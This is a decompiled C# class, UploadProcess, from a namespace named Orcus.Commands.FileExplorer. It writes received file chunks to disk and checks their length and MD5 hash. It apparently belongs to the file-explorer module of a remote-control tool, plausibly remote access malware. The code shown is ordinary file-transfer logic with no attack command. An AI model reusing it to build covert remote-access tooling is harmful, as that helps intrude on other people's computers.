using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Orcus.Shared.Commands.FileExplorer;

namespace Orcus.Commands.FileExplorer;

public class UploadProcess : IDisposable
{
	private readonly FileStream _fileStream;

	private bool _isDisposed;

	private bool _failed;

	public string Path { get; }

	public byte[] HashValue { get; }

	public long Length { get; }

	public UploadProcess(string path, byte[] hashValue, long length)
	{
		Path = path;
		HashValue = hashValue;
		Length = length;
		_fileStream = new FileStream(Path, FileMode.Create, FileAccess.ReadWrite);
	}

	public void ReceiveData(byte[] data, int index)
	{
		if (!_failed)
		{
			_fileStream.Write(data, index, data.Length - index);
		}
	}

	public UploadResult FinishUpload()
	{
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		if (!_failed)
		{
			if (_fileStream.Length != Length)
			{
				Failed();
				return (UploadResult)1;
			}
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				_fileStream.Position = 0L;
				if (!mD5CryptoServiceProvider.ComputeHash(_fileStream).SequenceEqual(HashValue))
				{
					Failed();
					return (UploadResult)3;
				}
			}
			Dispose();
			return (UploadResult)0;
		}
		return (UploadResult)2;
	}

	public void Failed()
	{
		_failed = true;
		Dispose();
		try
		{
			File.Delete(Path);
		}
		catch (Exception)
		{
		}
	}

	public void Dispose()
	{
		if (!_isDisposed)
		{
			_fileStream.Close();
			_isDisposed = true;
		}
	}
}
